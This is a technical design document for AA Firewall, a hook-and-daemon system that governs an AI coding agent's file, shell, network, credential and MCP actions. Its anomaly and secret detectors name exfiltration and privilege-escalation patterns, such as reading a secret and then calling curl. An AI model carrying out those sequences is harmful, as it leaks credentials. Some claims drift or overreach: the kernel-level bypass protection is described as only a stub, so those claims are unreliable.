> Author: Deepankar Das

# AA Firewall — Technical Design Document

> Implements: PRD Appendix C (Ratified Requirements)
> Phase 1 target: Claude Code (VS Code extension + CLI)
> Date: April 26, 2026

---

## Technical Executive Summary

### System Architecture

AA Firewall is a Hub + Sentinel hybrid governance system for AI coding agents. Each developer workstation runs a **Sentinel daemon** (`aafirewall-daemon`, port 9100) that evaluates policy locally and enforces decisions in-path, while a centralized **Management Hub** (`aafirewall-central`) distributes policies, aggregates audit events, and serves admin workflows. The Hub exposes two network interfaces: an mTLS client-facing channel on **port 9200** for Sentinel registration, policy pull, heartbeat, audit push, and approval synchronization, and an admin HTTP interface on **port 9201** for the Hub Console, RBAC-protected API, and approval resolution. All Hub-to-Sentinel communication is authenticated via mutual TLS with certificates loaded from a configurable `CERT_DIR` (default `/etc/aafirewall/certs`). Both the Hub audit store and Hub state store (policy revisions, client snapshots, enforcement state) are backed by **PostgreSQL** via `pgx/v5` connection pools. The system produces four statically compiled Go binaries (`CGO_ENABLED=0`): `aafirewall-daemon`, `aafirewall-hook`, `aafirewall-central`, and `aafirewall-client`. Zero runtime dependencies beyond PostgreSQL.

### Enforcement Model

The architecture defines 5 defense layers, of which Layers 1-3 and 5 are implemented:

1. **Runtime hooks** (Layer 1) -- The hook handler binary (`go/cmd/hookhandler/main.go`) registers Claude Code `PreToolUse` and `PostToolUse` hooks via `.claude/settings.json` (project-level) or managed-settings.json (enterprise MDM with `allowManagedHooksOnly=true`). The hook reads tool input from stdin, maps it through `enforcement.GetEnforcementPoint()` to an `ActionRequest`, and POSTs to the daemon's `/v1/evaluate` endpoint. Exit code 0 = allow, exit code 2 = block.
2. **Managed hooks** (Layer 2) -- Enterprise deployments use root-owned `/Library/Application Support/ClaudeCode/managed-settings.json` to prevent developers from removing hooks.
3. **Privileged daemon** (Layer 3) -- The Sentinel daemon (`go/internal/daemon/server.go`) runs as root via LaunchDaemon. It owns policy evaluation, approval lifecycle, audit buffering, and enforcement state. The daemon supports strict mode (`AA_STRICT_MODE=1`): unknown tools, unreachable daemon, and unparseable input all block instead of allowing.
4. **Kernel enforcer** (Layer 4) -- Stub; eBPF (Linux) / ESF (macOS) planned for Phase 2+.
5. **Management Hub** (Layer 5) -- `go/internal/central/server.go` implements `CentralServer` with PostgreSQL-backed `stateStore` and `auditStore`, in-memory approval registry, and RBAC middleware.

The system governs 6 enforcement surfaces: **filesystem** (path boundary enforcement, sensitive path blocking), **shell** (command classification, destructive pattern detection via `enforcement.ClassifyCommand()`), **network** (host allowlist/warning list via `policy/allowlist.go`), **package** (install detection via `enforcement.DetectPackageInstall()`), **credential** (secret command access via `enforcement.DetectSecretCommandAccess()`, sensitive file paths via `enforcement.DetectSensitiveFilePath()`), and **MCP** (tool invocation governance via `enforcement/mcpgateway.go`).

### Policy Engine

The policy engine (`go/internal/policy/engine.go`) evaluates rules in strict hierarchical order: **deny rules first, then require_approval, then allow, then default deny**. The function `ruleMatchesAction()` checks rule enablement, action type, subject (agent type + user), and resource conditions (path boundaries, command patterns, host allowlists, sensitive paths). The hierarchy module (`go/internal/policy/hierarchy.go`) enforces that child scopes (team, project, local) can only **tighten** parent policy -- `IsValidTightening()` compares `DecisionSeverity` values (allow=0 < simulate=1 < require_approval=2 < redact=3 < quarantine=4 < deny=5). `MergeHierarchy()` merges org -> team -> repo -> local bundles.

The default policy bundle (`policies/default.yaml`, version `v2026.04.29.1`) ships **13 rules** across 4 tiers: 6 deny rules (`org.block_non_project_writes`, `org.block_shell_deletes_outside_project`, `org.block_shell_moves_outside_project`, `org.block_sensitive_reads`, `org.block_non_allowlisted_hosts`, `org.deny_credential_access`), 4 require_approval rules (`org.approve_destructive_commands`, `org.approve_unknown_network`, `org.approve_package_installs`, `org.mcp_require_approval_untrusted`), and 3 allow rules (`org.allow_internal_tools`, `org.allow_project_files`, `org.allow_safe_commands`).

**8 canned policy packs** (`go/internal/policy/packs.go`) are available: source-code-protection, supply-chain-security, secrets-hardening, infrastructure-safety, network-egress-control, compliance-audit, dev-best-practices, and mcp-governance. Packs are applied via `ApplyPack()`, which skips rules whose `policy_id` already exists in the bundle.

Policy bundles are cryptographically signed using **Ed25519** (`go/internal/policy/signing.go`). `PolicySigner.Sign()` hashes the raw YAML with SHA-256, signs the hash, and attaches a `PolicySignature` with bundle hash, hex-encoded signature, timestamp, signer ID, and version. `VerifyAndCheckMonotonicity()` enforces **version monotonicity** -- a bundle version must be lexicographically >= the last accepted version, preventing rollback attacks.

### Approval Workflow

The approval flow is **non-blocking by design**. When policy evaluates to `require_approval`, the daemon's `ApprovalService` (`go/internal/approval/service.go`) creates a `PendingEntry` keyed by `approval_id`. The hook handler immediately exits with code 2 and a structured message containing the approval ID. The developer is not frozen.

The **Sentinel client agent** (`go/internal/client/agent.go`) runs on a 3-second sync cadence. Each cycle it queries `GET /v1/approvals/pending` on the local daemon and pushes pending requests to the Hub via `POST /api/v1/approvals/push` over the mTLS channel. The Hub stores approvals in memory. An admin resolves via `POST /api/v1/approvals/{id}/resolve` on the Hub Console (port 9201). The resolved decision piggybacks on the next client sync response. When approved, the local daemon registers a **single-use pre-approval scope** in the scope store.

On developer retry, the policy engine matches `require_approval` again, but `ApprovalService.CheckScope()` finds the matching scope via `MatchesScope()` (`go/internal/approval/scope.go`) and returns `allow`. Three scope types are supported: `single` (consumed after one use), `session` (persists for the session), and `time_bounded` (expires at a configured time). Unresolved approvals auto-deny after 300 seconds (configurable, `TimeoutDeny` behavior).

### Audit Pipeline

All audit events flow through an **append-only PostgreSQL store** (`go/internal/audit/pgstore.go`). The `PostgresStore.StoreEvent()` method validates every event through `ValidateAuditEvent()` (`go/internal/audit/validate.go`), which enforces 6 minimum gate fields: **who** (actor compound), **what** (action type + attempted action), **when** (timestamp), **policy** (policy_id@version), **decision**, and **result**. Events failing validation are rejected and counted (`totalRejected`). The INSERT uses `ON CONFLICT DO NOTHING` and the store exposes no UPDATE or DELETE operations -- append-only by construction.

A **SHA-256 hash chain** (`go/internal/audit/chain.go`) links events into a tamper-evident sequence. `AuditChain` maintains a `lastHash` (initialized to `"genesis"`), and each `ChainedEvent` includes `previous_hash`, `event_hash` (SHA-256 of event JSON + previous hash), and a monotonic `chain_index`. The chain supports `SignedExport` packages with Ed25519 signatures for forensic evidence export.

Decision values are normalized to a canonical set: `allow`, `deny`, `require_approval`, `simulate`, `redact`, `quarantine`, `allow_degraded`. The `SiemExporter` (`go/internal/audit/siem.go`) supports three transport modes -- **webhook** (HTTP POST), **syslog** (UDP/TCP), and **file** -- with configurable batch size and flush interval.

### Console Architecture

Two static Next.js builds are embedded in the Go binaries via `go:embed` (`go/internal/console/embed.go`):

- **Hub Console** (`out-hub`), served on port 9201 by `HubHandler()`, for security admins -- policy management, approval resolution, audit search, analytics dashboards, client fleet overview.
- **Sentinel Console** (`out-sentinel`), served on port 9100 by `SentinelHandler()`, for local developer visibility -- enforcement status, recent decisions, session detail.

The Hub enforces **three RBAC roles**: `admin` (policy CRUD, enforcement toggle, pack apply), `reviewer` (approve/deny approval requests), and `operator` (read-only access to audit, analytics, sessions, policies, clients, approvals). Auth tokens are loaded from environment variables (`AA_ADMIN_TOKEN`, `AA_REVIEWER_TOKEN`, `AA_OPERATOR_TOKEN`), files (`/etc/aafirewall/.*_token`), or encrypted database storage (`authsecrets.LoadTokens()`). The Sentinel daemon enforces `governed_user` filtering so a developer only sees their own audit events. Console navigation supports clickable drill-downs from Analytics dashboards to Search results to Session detail views.

### Security Boundaries

The Hub RBAC middleware (`go/internal/central/auth.go`) gates every admin API route (except `GET /api/v1/health`) by role. Policy CRUD and enforcement toggling require `admin`. Approval resolution requires `reviewer+`. All read endpoints require `operator+`. The Sentinel daemon (`go/internal/daemon/auth.go`) enforces its own route-level RBAC. The developer (governed user) has no access to policy editing, credential files, or daemon configuration. Token files at `/etc/aafirewall/` are root-owned. When `AA_ALLOW_LOCAL_POLICY_EDITS` is unset or false, the Sentinel daemon returns HTTP 403 on all policy mutation endpoints.

### Hook Handler

The hook handler (`go/cmd/hookhandler/main.go`) is invoked by Claude Code's `PreToolUse` and `PostToolUse` hooks. It reads JSON tool input from stdin, maps the tool name through `enforcement.GetEnforcementPoint()` to an `ActionRequest`, and POSTs to `http://127.0.0.1:9100/v1/evaluate`. Project root detection walks up from `cwd` looking for `.git/` or `.claude/` directory markers (`findProjectRoot()`), falling back to `cwd` or the `AA_WORKSPACE` environment variable. All hook invocations log to both stderr (visible to Claude Code) and `~/.aafirewall/hook.log` with UTC timestamps. Auth tokens are resolved from `AA_OPERATOR_TOKEN`, `AA_ADMIN_TOKEN`, or `/etc/aafirewall/.*_token` files. Internal orchestration tools (Agent, TodoWrite, Skill) are mapped to `internal.orchestration` action type and governed by `org.allow_internal_tools`.

### Key Technical Decisions

| Decision | Rationale |
|----------|-----------|
| **Go compiled binaries** (zero runtime deps) | Eliminates Node.js/Python runtime on developer machines; single binary deployment; `CGO_ENABLED=0` for static linking |
| **PostgreSQL over SQLite** | Append-only audit requires server-grade persistence; Hub aggregates events from multiple Sentinels; SQLite cannot handle concurrent writers across network |
| **Non-blocking approval over blocking** | Hook handler exits immediately (code 2) instead of polling; developer continues working; retry-on-approval via pre-approval scopes avoids freezing the coding agent |
| **Project-level hooks over managed-settings.json** | Lower friction for development and pilots; enterprise MDM path available for production lockdown with `allowManagedHooksOnly=true` |
| **Ed25519 over RSA/ECDSA** for policy signing | Smaller keys (32 bytes public), faster signing, no parameter choice complexity |
| **Embedded static console via `go:embed`** | Single binary serves both API and UI; no separate web server deployment; dual builds (Hub + Sentinel) from same Next.js codebase |
| **3-second client agent sync cadence** | Balances approval latency (admin decision reaches developer within ~6 seconds) against Hub load; configurable via `AA_SYNC_INTERVAL` |
| **SHA-256 hash chain for audit** | Tamper-evident without requiring blockchain infrastructure; genesis anchor; monotonic chain index enables gap detection |

---

## 1. Purpose

This TDD specifies the architecture, component design, data model, integration mechanisms, and implementation plan for the AA Firewall prototype. It is derived from the ratified requirements in PRD Appendix C and covers the six areas requested by the venture prompt: architecture decisions, interception layer placement, policy model, audit log schema, performance trade-offs, and what to change with more time.

---

## 2. Goals

- Intercept file system reads/writes, shell command execution, and network egress with pre-execution enforcement on all six surfaces — file, shell, network, package install, credential access, MCP tool calls (R-1).
- Enforce hierarchical policy with allow/deny/require-approval decisions, machine-readable reason codes, policy version stamping, and Ed25519 signed policy bundles with version monotonicity. Default bundle ships 13 rules across deny/require_approval/allow tiers including `org.allow_internal_tools` and `org.block_shell_moves_outside_project` (R-2).
- Produce structured, reviewer-grade, append-only audit logs with a mandatory minimum schema validation gate, SHA-256 hash-chain integrity, Ed25519 signed evidence exports, `gen_random_uuid()` for event IDs, decision normalization (strips ":REASON" suffix), unlimited default query limit, and `COALESCE` for NULL decision scanning (R-3).
- Implement non-blocking human-in-the-loop approval UX as the primary depth area: hook exits 2 immediately, Sentinel client agent syncs to Hub every 3 seconds, single-use scope on approve, browser-based delivery via Hub Console (port 9201), timeout behavior, reusable scopes, break-glass override, and RBAC (admin/reviewer/operator) (R-4).
- Provide OS-level enforcement via the `KernelEnforcer` interface — intercepts `file.open`, `execve`, and `connect` syscalls at the kernel level (eBPF on Linux, Endpoint Security Framework on macOS). Catches actions that bypass IDE hooks, including raw terminal commands. Interface defined with stub implementation; real kernel module implements the same 5-method interface (S-P2-01).
- Deploy as a Management Hub + Sentinel Agent architecture with mTLS, signed policy distribution, audit aggregation, and heartbeat-based health monitoring (F70, F73).
- Provide enterprise analytics and developer intelligence -- auto-classify developers into 10 behavioral groups with professional names (Compliant Developer, High-Friction Developer, Integration-Heavy Developer, Automation-Focused Developer, etc.) from audit data, stack-rank blocked operations with trend analysis, detect policy bottlenecks, generate actionable recommendations with one-click apply, and surface per-developer awareness scorecards showing `governed_user` (OS username) with display name from `groupMetadata`, compliance scores, contextual guidance on blocks, and weekly digests (F90-F96).
- Integrate with Claude Code (VS Code extension + CLI) as the Phase 1 agent target, with managed hooks that the developer cannot remove (C.6).

## 3. Non-Goals (Phase 1)

- Full endpoint security across non-agent activity.
- Support for every IDE, agent, and operating system in Phase 1.
- Cursor/Codex agent integration (Phase 2).
- Graph-native session replay with causal linking (Phase 2/3).
- Multi-agent trust envelopes and delegation lineage (Phase 3).
- Database-aware query-class policy and data masking (Phase 3).

> **Note:** Several items previously listed as Phase 2/3 non-goals have been implemented in Phase 1: MCP gateway (F32), secrets/PII redaction (F55), SIEM export (F56), policy simulation (F57), anomaly detection (F76), Management Hub with mTLS (F70), Sentinel Agent (F73), and canned policy packs (F80). See Section 3A for the updated feature-phase summary.

---

## 3A. Feature-Phase Summary

> **Authoritative detail:** The full Feature-Phase Matrix with all 64 features, dependencies, components, and status lives in [AA_Firewall_Implementation.md Section 10](AA_Firewall_Implementation.md#10-feature-phase-matrix-authoritative).
> This section is a **summary only**. When updating feature status, update the Implementation Plan first — this summary follows.

| Phase | Features | Description | Status |
|:-----:|:--------:|-------------|:------:|
| **Phase 0** | 10 | Foundations: types, schemas, policy engine, daemon, audit buffer | **All Done** |
| **Phase 1** | 45 | Enforcement wedge (5 surfaces), MCP gateway, approval UX, audit pipeline, review console (8 pages), container mode, Claude Code hooks, redaction engine, SIEM export, policy simulation, anomaly detection, Management Hub (mTLS), Sentinel Agent, policy packs, admin auth | **All Done** |
| **Phase 2** | 4 | Protocol expansion: Cursor/Codex integration, MCP method-level governance, hardened runtimes (gVisor/Kata), VS Code extension | Not Started |
| **Phase 3** | 5 | Enterprise: multi-agent governance, graph-native replay, database-aware controls, remote workspace support, CI/CD runner governance | Not Started |
| **Total** | **65** | | **55 Done / 10 Not Started** |

### Venture Prompt Requirements Traceability

> Full detail with rationale for deferred items is in [AA_Firewall_Implementation.md Section 10A](AA_Firewall_Implementation.md#10a-venture-prompt-requirements-traceability).

#### Req 1: Intercept agent actions (at least two of six)

| # | Surface | Implementing? | Feature(s) | Policy Rule(s) | Tests |
|:-:|---|:---:|---|---|---|
| 1a | File system reads/writes | **Yes** | F12 (fs-guard) | org.block_non_project_writes, org.block_sensitive_reads, org.allow_project_files | 16 policy engine |
| 1b | Shell command execution | **Yes** | F13 (shell-proxy), F15 (classifier) | org.approve_destructive_commands, org.allow_safe_commands | 27 classifier |
| 1c | Network calls | **Yes** | F14 (network-proxy) | org.block_non_allowlisted_hosts, org.approve_unknown_network | Demo scenario 5 |
| 1d | Package installs | **Yes** | F42 (package-guard) | org.approve_package_installs | 8 detection |
| 1e | Credential access | **Yes** | F43 (secret-detector) | org.deny_credential_access | 18 detection |
| 1f | Secret access | **Yes** | F43 (secret-detector) | org.block_sensitive_reads | Shared with 1e |

**Exceeds minimum:** All 6 surfaces implemented (prompt requires at least 2).

#### Req 2: Configurable policy with non-trivial rules

| # | Example Rule | Implementing? | Feature(s) | Policy Rule | Demo Scenario |
|:-:|---|:---:|---|---|---|
| 2a | Block writes outside project dir | **Yes** | F06, F11 | org.block_non_project_writes | Scenario 2 |
| 2b | Deny non-allowlisted hosts | **Yes** | F06, F11, F16 | org.block_non_allowlisted_hosts | Scenario 5 |
| 2c | Require approval for packages | **Yes** | F06, F11, F42 | org.approve_package_installs | Scenario 7 |

**Exceeds minimum:** All 3 examples implemented plus 10 more rules (13 total, including `org.allow_internal_tools`, `org.block_shell_deletes_outside_project`, `org.block_shell_moves_outside_project`). Hierarchical policy engine (F06, F07).

#### Req 3: Structured audit log

| Aspect | Implementing? | Feature(s) | Evidence |
|---|:---:|---|---|
| Structured, machine-parsable events | **Yes** | F03 (schema), F05 (validation gate) | 15+ field schema, Zod-validated, 6-field minimum gate |
| Meaningful to security reviewer | **Yes** | F35 (review console) | 7-page Next.js + shadcn/ui console, 25 E2E tests |
| Session replay | **Yes** | F26 (store), F28 (query API) | Chronological timeline, filter by decision, export JSON |
| Append-only immutability | **Yes** | F10 (buffer), F26 (store), F38 (PostgreSQL) | No UPDATE/DELETE. Schema gate rejects invalid events. |

#### Req 4: Depth area (implement one of five)

| # | Depth Area | Implementing? | Depth Level | Feature(s) | Why This Decision |
|:-:|---|:---:|:---:|---|---|
| 4a | Real-time approval UX | **Yes** | **Deep (primary)** | F21-F25, F30, F39 (8 features, 20 tests) | Full lifecycle: create/resolve/timeout. In-IDE + browser. Reusable scopes, break-glass. SLA targets. Chosen because it directly demonstrates the product's core value: converting "blocked" to "approved with oversight." |
| 4b | Anomaly detection | **Yes** | **Implemented** | F76 (`src/intelligence/anomaly.ts`, 7 tests) | 8 deterministic anomaly patterns: exfil_secret_then_network, exfil_read_then_curl, privesc_cred_then_exec, recon_rapid_reads, supply_chain_lockfile_then_install, destructive_multi_delete, destructive_force_push_after_reset, evasion_denied_then_retry. Sequence-based detection on action windows — no ML baseline required. |
| 4c | Secrets/PII redaction | **Yes** | **Full** | F43 (secret-detector) + F55 (`src/enforcement/redaction.ts`, 22 tests) | Detection of 20+ secret patterns (AWS keys, GitHub tokens, JWTs, private keys, DB URLs, SSNs, credit cards). Three redaction modes: mask, tokenize (reversible), summarize. De-tokenization for authorized recovery. Verification function ensures no plaintext leaks. |
| 4d | Multi-agent isolation | **No** | -- | Deferred (F74, Phase 3) | Phase 1 governs one agent (Claude Code). Isolation needs multiple agents sharing a workspace. Schema ready (session_id, correlation_id). |
| 4e | Org-level policy distribution | **Yes** | **Implemented** | F70 (`src/central/server.ts`), F73 (`src/client/agent.ts`) | Management Hub on port 9200 (mTLS client API) + 9201 (admin HTTPS). Sentinel Agent with registration, policy sync, audit forwarding, heartbeat. mTLS certificate-based authentication. Deployment via `scripts/aafirewall_deploy.sh`. |

#### Req 5: Depth over breadth

| Principle | How We Follow It |
|---|---|
| Go deep on one area | Approval UX: 8 features, 20 tests, full lifecycle, two delivery channels, configurable timeout, reusable scopes, break-glass, audit integration for every state change |
| Stronger than touching all | One depth area (4d) explicitly deferred with documented rationale. Four areas implemented. |

#### Summary

| Requirement | Sub-items | Implemented | Exceeds? |
|---|:---:|:---:|:---:|
| 1. Intercept (at least 2) | 6 | 6/6 | Yes |
| 2. Policy (at least 1 rule) | 3 examples | 13 rules + 8 canned packs | Yes |
| 3. Structured audit | 1 | Done + SIEM export | Yes |
| 4. Depth area (1 of 5) | 5 options | 4 implemented (4a deep, 4b, 4c, 4e) | Yes |
| 5. Depth over breadth | 1 | Followed — deep on approval UX, substantial on 3 others | Yes |

---

## 4. Architecture Decisions

### 4.1 Why Hybrid

No single enforcement point governs all agent action surfaces. A runtime hook sees agent intent but cannot enforce if the agent bypasses the SDK. A container constrains execution but cannot govern external tool traffic. A proxy controls network but cannot see local file operations. An OS kernel module can intercept all syscalls but cannot see agent intent. AA Firewall therefore uses a hybrid architecture that layers multiple complementary enforcement points — from IDE hooks (intent-aware, fastest) through the policy daemon (centralized decision-making) down to the OS kernel (eBPF/ESF, tamper-resistant, catches raw terminal bypass) — all coordinated by a privileged daemon and the Management Hub.

### 4.2 Architecture Overview

> **Tamper-resistant by design.** The developer cannot disable governance. Managed hooks are enforced by OS-level settings (`/Library/Application Support/ClaudeCode/managed-settings.json` with `allowManagedHooksOnly=true`) — developers cannot modify or remove them without root access. The daemon runs as a privileged system service (`LaunchDaemon` on macOS) with `KeepAlive` — developers cannot kill it. Policy bundles are Ed25519-signed and distributed from the Management Hub — developers cannot modify local policy without detection. The kernel enforcer intercepts syscalls at the OS level — developers cannot bypass governance even from a raw terminal.

```
┌──────────────────────────────────────────────────────────────────────┐
│                        Developer Machine                              │
│                                                                      │
│  ┌──────────────┐    ┌───────────────────────────────────────────┐   │
│  │  VS Code      │    │  Claude Code Agent (Extension or CLI)     │   │
│  │               │◄──►│  Managed hooks enforce AA Firewall        │   │
│  └──────┬───────┘    └──────┬───────┬───────┬───────┬──────────┘   │
│         │                   │       │       │       │               │
│         │  ┌────────────────▼───────▼───────▼───────▼────────────┐ │
│         │  │          Application Enforcement (IDE hooks)          │ │
│         │  │  FS Guard │ Shell Proxy │ Net Proxy │ MCP Gateway    │ │
│         │  │  Pkg Guard│ Secret Det  │ Redaction │ Bypass Det     │ │
│         │  └────────────────────────┬────────────────────────────┘ │
│         │                           │                               │
│  ┌──────┼───────────────────────────┼───────────────────────────┐  │
│  │      │    Privileged Daemon (root / LaunchDaemon, port 9100) │  │
│  │      │  ┌────────────────────────▼──────────────────────┐    │  │
│  │      │  │ Policy Engine (signed bundles, hierarchy)      │    │  │
│  │      └─►│ Approval Router │ RBAC Auth │ Strict Mode      │    │  │
│  │         │ Audit Buffer    │ Anomaly Detector (8 patterns) │    │  │
│  │         │ SIEM Exporter   │ Enforcement State (on/off)    │    │  │
│  │         └────────────────────────┬──────────────────────┘    │  │
│  │                                  │                            │  │
│  │  ┌──────────────────────────┐    │    ┌──────────────────┐   │  │
│  │  │ Sentinel Agent           │◄───┘    │ Managed Hooks    │   │  │
│  │  │ (policy sync, audit fwd, │         │ (cannot remove)  │   │  │
│  │  │  heartbeat every 30s)    │         └──────────────────┘   │  │
│  │  └──────────┬───────────────┘                                │  │
│  └─────────────┼────────────────────────────────────────────────┘  │
│                │                                                    │
│  ┌─────────────┼────────────────────────────────────────────────┐  │
│  │             │      OS Kernel Enforcement                      │  │
│  │  ┌──────────▼──────────────────────────────────────────────┐ │  │
│  │  │ KernelEnforcer (eBPF on Linux / ESF on macOS)           │ │  │
│  │  │ Syscall gate: file.open, execve, connect, bind          │ │  │
│  │  │ Catches raw terminal commands that bypass IDE hooks      │ │  │
│  │  └────────────────────────────────────────────────────────┘ │  │
│  └──────────────────────────────────────────────────────────────┘  │
│                │                                                    │
│  ┌─────────────▼──┐  ┌──────────────────┐                         │
│  │ PostgreSQL      │  │ Sentinel Console │                         │
│  │ (audit_events,  │  │ (port 9100,      │                         │
│  │  append-only)   │  │  developer-      │                         │
│  │                 │  │  personal view)  │                         │
│  └────────────────┘  └──────────────────┘                         │
└───────────────┬───────────────────────────────────────────────────┘
                │ mTLS (client cert)
┌───────────────▼───────────────────────────────────────────────────┐
│              AA Firewall Management Hub (Security Team)            │
│  ┌────────────────┐  ┌────────────────┐  ┌──────────────────┐    │
│  │ Policy Distrib  │  │ Audit Aggreg   │  │ Hub Console      │    │
│  │ (signed bundles)│  │ (all machines) │  │ (admin dashboard, │    │
│  │ (port 9200)     │  │                │  │  port 9201)      │    │
│  └────────────────┘  └────────────────┘  └──────────────────┘    │
└───────────────────────────────────────────────────────────────────┘
```

### 4.3 Component Inventory

| Component | Responsibility | Phase | Key Files |
|---|---|---|---|
| **Local Daemon** | Receives action requests, evaluates policy, routes approvals, buffers audit events | Phase 0/1 | `src/daemon/server.ts` |
| **Filesystem Guard** | Intercepts file reads/writes, enforces path policy | Phase 1 | `src/enforcement/fs-guard.ts` |
| **Shell Proxy** | Intercepts shell commands, enforces command-pattern policy | Phase 1 | `src/enforcement/shell-proxy.ts` |
| **Network Proxy** | Intercepts outbound HTTP(S), enforces host allowlists | Phase 1 | `src/enforcement/network-proxy.ts` |
| **Package Guard** | Detects package installs (npm/pip/brew/yarn/cargo), requires approval | Phase 1 | `src/enforcement/package-guard.ts` |
| **Secret Detector** | Detects access to SSH keys, AWS creds, .env, API keys | Phase 1 | `src/enforcement/secret-detector.ts` |
| **Redaction Engine** | Scans for 20+ secret/PII patterns, mask/tokenize/summarize modes | Phase 1 | `src/enforcement/redaction.ts` |
| **MCP Gateway** | Protocol-aware MCP tool governance with server registry and trust levels | Phase 1 | `src/enforcement/mcp-gateway.ts` |
| **Policy Engine** | Evaluates hierarchical policy bundles, returns decisions with reason codes | Phase 0/1 | `src/policy/engine.ts` |
| **Policy Hierarchy** | Org → team → repo → local merge with tighten-only constraint | Phase 0/1 | `src/policy/hierarchy.ts` |
| **Policy Packs** | 8 canned industry policy packs (SOC2, supply chain, secrets, etc.) | Phase 1 | `src/policy/packs.ts` |
| **Approval Service** | Manages approval lifecycle: create, route, resolve, timeout, audit | Phase 1 | `src/approval/service.ts` |
| **Audit Store** | PostgreSQL append-only ingestion. No in-memory fallback — `NoOpStore` rejects ops when PG unavailable. | Phase 0/1 | `src/audit/store.ts`, `go/internal/audit/pgstore.go` |
| **Audit Buffer** | In-memory queue buffer with 10K cap, 80% backpressure (Go: `go/internal/audit/buffer.go`) | Phase 0/1 | `src/audit/buffer.ts`, `go/internal/audit/buffer.go` |
| **Flush Service** | Background flush from buffer to PostgreSQL with retry/backoff (Go: goroutine + ticker) | Phase 1 | `src/audit/flush.ts`, `go/internal/audit/flush.go` |
| **SIEM Exporter** | Webhook, syslog (UDP), and JSONL file export transports | Phase 1 | `src/audit/siem-export.ts` |
| **Anomaly Detector** | 8 deterministic sequence-based anomaly patterns | Phase 1 | `src/intelligence/anomaly.ts` |
| **Management Hub** | mTLS server for policy distribution, audit aggregation, agent registration | Phase 1 | `src/central/server.ts` |
| **Sentinel Agent** | Registration, policy sync, audit forwarding, heartbeat to Management Hub | Phase 1 | `src/client/agent.ts` |
| **Sentinel Console** | Developer-personal view: my blocks, my compliance score, my session history. No admin access. Built as `out-sentinel` static export, embedded in Go daemon binary via `go:embed`, served on port 9100 by `SentinelHandler()`. | Phase 1 | `console/` |
| **Hub Console** | Admin dashboard: all developers, policy management, approval workflow, analytics, group management. Built as `out-hub` static export, embedded in Go central binary via `go:embed`, served on port 9201 by `HubHandler()`. Dual builds from same Next.js codebase with `isHubMode()` detection for separate navigation. | Phase 1 | `console/` |
| **Admin Auth** | Admin token authentication for management endpoints | Phase 1 | `src/daemon/auth.ts` |
| **Enforcement State** | Global on/off toggle with timestamp and changed_by tracking | Phase 1 | `src/daemon/enforcement-state.ts` |
| **KernelEnforcer (OS Guard)** | Intercepts file.open, execve, connect syscalls at kernel level (eBPF on Linux, ESF on macOS). Catches raw terminal bypass. | Phase 1 (stub) | `go/internal/enforcement/osguard/kernel.go`, `stub.go` |
| **Analytics Engine** | Aggregation queries, synthetic developer grouping (10 groups with professional names), policy recommendations, developer awareness scorecards showing `governed_user` with display name from `groupMetadata` | Phase 1 | `go/internal/analytics/` |
| **Analytics Dashboard** | Stack-ranked blocked ops, developer groups donut chart, friction heatmap, one-click recommendations | Phase 1 | `console/src/app/analytics/` |
| **Developer Scorecard** | Per-developer compliance score, group badge, trend, contextual tips, weekly digest | Phase 1 | `console/src/app/developer/` |
| **VS Code Extension** | Surfaces approval prompts in-IDE, shows policy decisions, links to audit | Phase 2 | `extension/` (not yet implemented) |

### 4.4 System Architecture Diagram

```mermaid
flowchart TB
    subgraph IDE["VS Code IDE"]
        CC["Claude Code<br/>(Extension or CLI)"]
    end

    subgraph Enforcement["Enforcement Layer (Application)"]
        FSG["Filesystem Guard"]
        SP["Shell Proxy"]
        NP["Network Proxy"]
        PG_["Package Guard"]
        SD["Secret Detector"]
        MCPG["MCP Gateway"]
        BD["Bypass Detector"]
        RD["Redaction Engine"]
    end

    subgraph KernelLayer["OS Kernel Enforcement"]
        KE["KernelEnforcer<br/>(eBPF on Linux /<br/>ESF on macOS)"]
        SG["Syscall Gate<br/>(file.open, execve,<br/>connect, bind)"]
    end

    subgraph Daemon["AA Firewall Daemon (privileged, port 9100)"]
        PE["Policy Engine<br/>(hierarchical cache)"]
        PP["Policy Packs<br/>(8 canned packs)"]
        AR["Approval Router"]
        AB["Audit Buffer"]
        AD["Anomaly Detector<br/>(8 patterns)"]
        SIEM["SIEM Exporter<br/>(webhook/syslog/file)"]
        AUTH["Admin Auth<br/>(RBAC: admin/reviewer/operator)"]
        ES["Enforcement State<br/>(on/off toggle)"]
        SM["Strict Mode"]
    end

    subgraph SentinelAgent["Sentinel Agent"]
        CA["Registration<br/>Policy Sync<br/>Audit Forward<br/>Heartbeat (30s)"]
    end

    subgraph Central["Management Hub (mTLS, port 9200)"]
        CPE["Policy Distribution<br/>(signed bundles)"]
        AAG["Audit Aggregation<br/>(PostgreSQL)"]
        REG["Agent Registration"]
        AdminAPI["Admin API<br/>(port 9201)"]
    end

    subgraph Local["Local Services"]
        AS["Audit Store<br/>(PostgreSQL, append-only)"]
        RC["Sentinel Console<br/>(Next.js, port 9100)"]
    end

    subgraph AdminDash["Security Team"]
        AD2["Admin Dashboard<br/>(browser)"]
    end

    CC -- "tool call<br/>(Read/Write/Bash/...)" --> FSG & SP & NP & PG_ & SD & MCPG
    CC -- "OS-level action" --> SG
    SG -- "evaluate" --> KE
    KE -- "audit event" --> AB
    KE -- "allow/deny" --> SG

    FSG & SP & NP & PG_ & SD & MCPG -- "evaluate" --> PE
    BD -- "ungoverned alert" --> AB

    PE -- "require_approval" --> AR
    PE -- "decision" --> FSG & SP & NP & PG_ & SD & MCPG

    PE -- "audit event" --> AB
    AB -- "scan" --> AD
    AB -- "redact" --> RD
    AB -- "flush" --> AS
    AB -- "export" --> SIEM
    AS -- "query" --> RC

    CA -- "policy sync (mTLS)" --> CPE
    CA -- "audit forward (mTLS)" --> AAG
    CA -- "heartbeat (mTLS)" --> REG
    CA -- "loads policy" --> PE
    AB -- "events" --> CA

    AD2 -- "manage" --> AdminAPI
    AdminAPI --> CPE & AAG

    style KernelLayer fill:#0f3460,stroke:#e94560,color:#fff
    style Central fill:#1a1a2e,stroke:#e94560,color:#fff
```

### 4.5 Data Flow — End-to-End Action Lifecycle

Every governed action follows the same lifecycle regardless of surface:

```mermaid
flowchart LR
    A["Agent attempts<br/>action"] --> B["Enforcement point<br/>intercepts"]
    B --> C["Daemon evaluates<br/>policy"]
    C --> D{Decision}
    D -- "allow" --> E["Execute action"]
    D -- "deny" --> F["Block action<br/>return rationale"]
    D -- "require_approval" --> G["Hook exits code 2<br/>(non-blocking)"]
    G --> G2["observed_effect<br/>= pending_approval"]
    G2 --> H{Reviewer decision<br/>via Hub Console}
    H -- "approve" --> H2["Register single-use<br/>pre-approval scope"]
    H2 --> H3["Developer retries<br/>scope matches"]
    H3 --> E
